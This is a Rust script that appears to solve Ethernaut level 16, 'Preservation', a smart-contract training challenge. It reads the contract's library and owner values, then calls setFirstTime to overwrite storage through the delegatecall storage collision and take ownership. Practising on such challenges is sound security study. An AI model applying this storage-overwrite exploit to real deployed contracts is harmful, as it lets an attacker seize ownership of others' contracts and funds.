#[allow(unused_imports)]
use alloy::{
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Bytes, U256, address, Address,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol!{
    #[sol(rpc)]
    contract Preservation {
        function setFirstTime(uint256 _timeStamp) public;
        function timeZone1Library() external view returns (address);
        function owner() external view returns (address);
    }

    // #[sol(rpc)]
    // contract Exp {
    //     function setTime(uint256 _owner) public;
    // }
}

use crate::ethernaut;
use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level16_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level16())?;

    Ok(())
}

async fn level16() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);

    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;

    let preservation_address = "0x7A7502bf6ef28B8bc6818aa59503Fb999a71c8ae".parse()?;
    let preservation = Preservation::new(
        preservation_address,
        provider.clone()
    );
    // let exp_address = "0xcAe287b108E88A694E1a86114F15894ec5Ff85E8".parse()?;

    println!("[CHECK]");
    let lib = preservation.timeZone1Library().call().await?;
    let owner = preservation.owner().call().await?;
    println!("[Preservation.timeZone1Library()]    lib = {}", lib);
    println!("[Preservation.owner()]    owner = {}", owner);

    // let time_tx = preservation.setFirstTime(exp_address)
    //     .send()
    //     .await?;
    // println!("[Preservation.setFirstTime()]    Panding transaction... {}", time_tx.tx_hash());

    // let time_receipt = time_tx.get_receipt().await?;
    // println!(
    //     "[Preservation.setFirstTime()]    transaction included in block {}\n",
    //     time_receipt.block_number.expect("Failed to get block number")
    // );
    
    println!("[CHECK]");
    let lib = preservation.timeZone1Library().call().await?;
    let owner = preservation.owner().call().await?;
    println!("[Preservation.timeZone1Library()]    lib = {}", lib);
    println!("[Preservation.owner()]    owner = {}", owner);

    let time_tx = preservation.setFirstTime(
        ethernaut::ALICE.parse()?
    )
        .send()
        .await?;
    println!("[Preservation.setFirstTime()]    Panding transaction... {}", time_tx.tx_hash());

    let time_receipt = time_tx.get_receipt().await?;
    println!(
        "[Preservation.setFirstTime()]    transaction included in block {}\n",
        time_receipt.block_number.expect("Failed to get block number")
    );
    
    println!("[CHECK]");
    let lib = preservation.timeZone1Library().call().await?;
    let owner = preservation.owner().call().await?;
    println!("[Preservation.timeZone1Library()]    lib = {}", lib);
    println!("[Preservation.owner()]    owner = {}", owner);

    Ok(())
}
